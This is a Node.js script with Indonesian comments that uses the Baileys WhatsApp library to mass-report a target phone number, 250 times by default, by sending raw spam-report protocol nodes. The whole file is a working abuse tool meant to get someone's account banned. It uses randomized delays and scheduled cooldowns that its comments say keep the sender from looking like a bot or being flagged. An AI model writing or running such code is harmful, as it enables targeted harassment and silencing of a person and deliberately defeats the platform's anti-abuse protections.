const { delay } = require('@whiskeysockets/baileys');

async function banWhatsAppMassal(sock, target, amount = 250, logger = console.log) {
    if (!sock) throw new Error("Koneksi Baileys (sock) tidak valid.");
    
    const cleanTarget = target.replace(/[^0-9]/g, '');
    const jidTarget = `${cleanTarget}@s.whatsapp.net`;
    let success = 0;
    let fail = 0;

    logger(`[REPORT] Mulai tembak ${cleanTarget} sebanyak ${amount}x`);

    for (let i = 1; i <= amount; i++) {
        try {
            // Payload asli WA
            const reportPayload = {
                tag: "iq",
                attrs: {
                    to: "s.whatsapp.net",
                    type: "set",
                    xmlns: "urn:xmpp:whatsapp:spam"
                },
                content: [
                    { tag: "report", attrs: { jid: jidTarget } }
                ]
            };

            await sock.sendNode(reportPayload);
            success++;
            logger(`[${i}/${amount}] ✅ Sukses report`);

            // Jeda normal antar report (2-5 detik) biar gak keliatan kayak bot
            await delay(Math.floor(Math.random() * 3000) + 2000);

            // TRIK COOLDOWN: Tiap 25 report, istirahat 1 menit (60 detik)
            if (i % 25 === 0 && i < amount) {
                logger(`[⏳] Cooldown 60 detik biar akun gak di-flag...`);
                await delay(60000); 
            }

        } catch (err) {
            fail++;
            logger(`[${i}/${amount}] ❌ Gagal: ${err.message}`);
            // Kalau koneksi putus (statusCode 428/timeout), kita istirahatin 10 detik
            if (err.message.includes("Connection Closed") || err.message.includes("timeout")) {
                logger(`[!] Koneksi putus, jeda 10 detik sebelum lanjut...`);
                await delay(10000);
            }
        }
    }

    logger(`[REPORT] Selesai. Berhasil: ${success}, Gagal: ${fail}`);
    return { success, fail, target: cleanTarget };
}
